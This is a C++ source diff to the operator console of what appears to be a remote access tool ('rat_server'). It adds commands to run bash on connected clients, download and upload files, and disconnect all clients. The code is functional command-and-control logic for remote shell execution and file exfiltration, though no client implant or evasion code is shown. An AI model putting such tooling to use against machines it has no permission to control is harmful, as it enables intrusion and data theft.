@@ -1,8 +1,11 @@
 #include "ServerCommandController.hpp"
 #include "ServerManager.hpp"
 #include "ServerLogController.hpp"
+#include "ServerFileController.hpp"
 #include <iostream>
 #include <sstream>
+#include <fstream>
+#include <termios.h>
 #include "Utils/TCPSocket.hpp"
 #include <unistd.h>
 #include <sys/types.h>
@@ -13,7 +16,7 @@
 
 namespace Server {
 
-ServerCommandController::ServerCommandController(ServerManager *manager) : ServerController(nullptr), manager_(manager) {}
+ServerCommandController::ServerCommandController(ServerManager *manager) : IController(manager), manager_(manager) {}
 ServerCommandController::~ServerCommandController() { stop(); }
 
 void ServerCommandController::start() {
@@ -26,6 +29,12 @@ void ServerCommandController::start() {
     }
 }
 
+void ServerCommandController::handle(const nlohmann::json &packet) {
+    // Receive bash command responses and store them
+    std::lock_guard<std::mutex> lock(bashMtx_);
+    bashResponses_.push(packet);
+}
+
 // spawn a terminal emulator (or tmux) to run innerCmd; returns pid (>0) for forked child,
 // 0 when launched in tmux, -1 on failure
 pid_t ServerCommandController::spawnTerminal(const std::string &innerCmd) {
@@ -35,8 +44,13 @@ pid_t ServerCommandController::spawnTerminal(const std::string &innerCmd) {
     };
 
     std::string prog;
-    if (which_ok("gnome-terminal")) prog = "gnome-terminal";
+    if (which_ok("qterminal")) prog = "qterminal";
+    else if (which_ok("xfce4-terminal")) prog = "xfce4-terminal";
+    else if (which_ok("gnome-terminal")) prog = "gnome-terminal";
     else if (which_ok("konsole")) prog = "konsole";
+    else if (which_ok("tilix")) prog = "tilix";
+    else if (which_ok("alacritty")) prog = "alacritty";
+    else if (which_ok("kitty")) prog = "kitty";
     else if (which_ok("xterm")) prog = "xterm";
     else if (which_ok("tmux")) prog = "tmux";
     else return -1;
@@ -50,10 +64,29 @@ pid_t ServerCommandController::spawnTerminal(const std::string &innerCmd) {
     pid_t pid = fork();
     if (pid < 0) return -1;
     if (pid == 0) {
-        if (prog == "gnome-terminal") {
+        setsid();
+        
+        int devnull = open("/dev/null", O_WRONLY);
+        if (devnull != -1) {
+            dup2(devnull, STDOUT_FILENO);
+            dup2(devnull, STDERR_FILENO);
+            close(devnull);
+        }
+        
+        if (prog == "qterminal") {
+            execlp("qterminal", "qterminal", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
+        } else if (prog == "xfce4-terminal") {
+            execlp("xfce4-terminal", "xfce4-terminal", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
+        } else if (prog == "gnome-terminal") {
             execlp("gnome-terminal", "gnome-terminal", "--", "bash", "-c", innerCmd.c_str(), (char *)NULL);
         } else if (prog == "konsole") {
             execlp("konsole", "konsole", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
+        } else if (prog == "tilix") {
+            execlp("tilix", "tilix", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
+        } else if (prog == "alacritty") {
+            execlp("alacritty", "alacritty", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
+        } else if (prog == "kitty") {
+            execlp("kitty", "kitty", "bash", "-c", innerCmd.c_str(), (char *)NULL);
         } else if (prog == "xterm") {
             execlp("xterm", "xterm", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
         }
@@ -77,12 +110,46 @@ std::string ServerCommandController::processLine(const std::string &line) {
     } else if (cmd == "kill") {
         std::string name; iss >> name;
         return handleKill(name);
+    } else if (cmd == "killall") {
+        return handleKillAll();
     } else if (cmd == "bash") {
         std::string name; iss >> name;
         std::string rest;
         std::getline(iss, rest);
         if (!rest.empty() && rest.front() == ' ') rest.erase(0,1);
         return handleBash(name, rest);
+    } else if (cmd == "download") {
+        std::string arg1, arg2, arg3;
+        iss >> arg1 >> arg2 >> arg3;
+        std::string name, remotePath, localPath;
+        if (manager_->hasClient(arg1)) {
+            name = arg1;
+            remotePath = arg2;
+            localPath = arg3.empty() ? "." : arg3;
+        } else {
+            name = "";
+            remotePath = arg1;
+            localPath = arg2.empty() ? "." : arg2;
+        }
+        std::string targetClient = name.empty() ? selectedClient_ : name;
+        ServerFileController fileCtrl(manager_);
+        return fileCtrl.handleDownload(targetClient, remotePath, localPath);
+    } else if (cmd == "upload") {
+        std::string arg1, arg2, arg3;
+        iss >> arg1 >> arg2 >> arg3;
+        std::string name, localPath, remotePath;
+        if (manager_->hasClient(arg1)) {
+            name = arg1;
+            localPath = arg2;
+            remotePath = arg3.empty() ? "." : arg3;
+        } else {
+            name = "";
+            localPath = arg1;
+            remotePath = arg2.empty() ? "." : arg2;
+        }
+        std::string targetClient = name.empty() ? selectedClient_ : name;
+        ServerFileController fileCtrl(manager_);
+        return fileCtrl.handleUpload(targetClient, localPath, remotePath);
     } else if (cmd == "quit") {
         return handleQuit();
     } else if (cmd == "showlogs") {
@@ -97,7 +164,10 @@ std::string ServerCommandController::handleList() {
     auto clients = manager_->listClients();
     if (clients.empty()) return "No clients connected\n";
     reply = "Connected clients:\n";
-    for (auto &c : clients) reply += "  - " + c + "\n";
+    for (auto &c : clients) {
+        std::string ip = manager_->getClientIP(c);
+        reply += "  - " + c + " (" + ip + ")\n";
+    }
     return reply;
 }
 
@@ -109,8 +179,11 @@ std::string ServerCommandController::handleHelp() {
     help += "  list                     - List all connected clients\n";
     help += "  choose <client>          - Select a client for subsequent commands\n";
     help += "  kill [client]            - Disconnect client (uses selected if not specified)\n";
+    help += "  killall                  - Disconnect all clients\n";
     help += "  bash [client] <command>  - Execute shell command (uses selected if not specified)\n";
-    help += "  showlogs                 - Open log viewer in new terminal\n";
+    help += "  download [client] <remote_path> [local_path]  - Download file from client (default: .)\n";
+    help += "  upload [client] <local_path> [remote_path]    - Upload file to client (default: .)\n";
+    help += "  showlogs                 - Open log viewer in new terminal (tail -F)\n";
     help += "  quit                     - Stop server and exit\n";
     help += "\nWorkflow:\n";
     help += "  1. list                  - See connected clients\n";
@@ -149,11 +222,48 @@ std::string ServerCommandController::handleKill(const std::string &name) {
         return "Invalid characters in client name\n";
     }
     
+    IController *ctrl = manager_->getController(targetClient);
+    if (ctrl) {
+        nlohmann::json killCmd;
+        killCmd["controller"] = "kill";
+        ctrl->sendJson(killCmd);
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    }
+    
     if (manager_->removeClient(targetClient)) {
         if (targetClient == selectedClient_) selectedClient_.clear();
         return std::string("Killed ") + targetClient + "\n";
     }
     return std::string("No such client\n");
+}
+
+std::string ServerCommandController::handleKillAll() {
+    if (!manager_) return "Manager not available\n";
+    
+    auto clients = manager_->listClients();
+    if (clients.empty()) return "No clients connected\n";
+    
+    int killed = 0;
+    nlohmann::json killCmd;
+    killCmd["controller"] = "kill";
+    
+    for (const auto &clientName : clients) {
+        IController *ctrl = manager_->getController(clientName);
+        if (ctrl) {
+            ctrl->sendJson(killCmd);
+        }
+    }
+    
+    std::this_thread::sleep_for(std::chrono::milliseconds(300));
+    
+    for (const auto &clientName : clients) {
+        if (manager_->removeClient(clientName)) {
+            killed++;
+        }
+    }
+    
+    selectedClient_.clear();
+    return "Killed " + std::to_string(killed) + " client(s)\n";
 }
 
 std::string ServerCommandController::handleBash(const std::string &name, const std::string &cmd) {
@@ -189,35 +299,46 @@ std::string ServerCommandController::handleBash(const std::string &name, const s
         return "Failed to send command\n";
     }
     
-    int maxWait = 50;
-    int waited = 0;
-    std::string lg;
-    bool foundResponse = false;
-    std::string output;
-    
-    while (waited < maxWait && !foundResponse) {
-        std::this_thread::sleep_for(std::chrono::milliseconds(100));
-        while (manager_->popLog(lg)) {
-            try {
-                nlohmann::json j = nlohmann::json::parse(lg);
-                if (j.contains("out") && j["out"].is_string()) {
-                    output = j["out"].get<std::string>();
-                    int ret = j.contains("ret") ? j["ret"].get<int>() : -1;
-                    foundResponse = true;
-                    return "Output:\n" + output + "Exit code: " + std::to_string(ret) + "\n";
-                }
-            } catch (...) {}
+    nlohmann::json response;
+    if (popBashResponse(response, 5000)) {
+        if (response.contains("out") && response["out"].is_string()) {
+            std::string output = response["out"].get<std::string>();
+            int ret = response.contains("ret") ? response["ret"].get<int>() : -1;
+            return "Output:\n" + output + "Exit code: " + std::to_string(ret) + "\n";
         }
-        waited++;
     }
     
     return "(No response - command may still be running)\n";
 }
 
+bool ServerCommandController::popBashResponse(nlohmann::json &out, int timeoutMs) {
+    auto start = std::chrono::steady_clock::now();
+    while (true) {
+        {
+            std::lock_guard<std::mutex> lock(bashMtx_);
+            if (!bashResponses_.empty()) {
+                out = bashResponses_.front();
+                bashResponses_.pop();
+                return true;
+            }
+        }
+        
+        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
+            std::chrono::steady_clock::now() - start).count();
+        if (elapsed >= timeoutMs) return false;
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+}
+
 std::string ServerCommandController::handleQuit() {
     running_ = false;
-    if (manager_) manager_->stop();
-    return std::string("Quitting\n");
+    if (manager_) {
+        manager_->stop();
+        std::cout << "\nServer shutting down..." << std::endl;
+    }
+    std::exit(0);
+    return std::string();
 }
 
 std::string ServerCommandController::handleShowLogs() {
@@ -228,7 +349,8 @@ std::string ServerCommandController::handleShowLogs() {
     if (!slc) return std::string("Invalid log controller\n");
     std::string path = manager_->logPath();
     if (path.empty()) path = "/tmp/rat_server.log";
-    std::string inner = std::string("../build_make/log_script ") + path + std::string("; exec bash");
+    
+    std::string inner = std::string("tail -F ") + path + std::string("; exec bash");
     pid_t p = spawnTerminal(inner);
     if (p == -1) return std::string("No terminal emulator available\n");
     if (p == 0) return std::string("Launched in tmux session\n");
@@ -264,5 +386,4 @@ void ServerCommandController::stop() {
     if (stdinThread_ && stdinThread_->joinable()) stdinThread_->join();
 }
 
-} 
-
+}
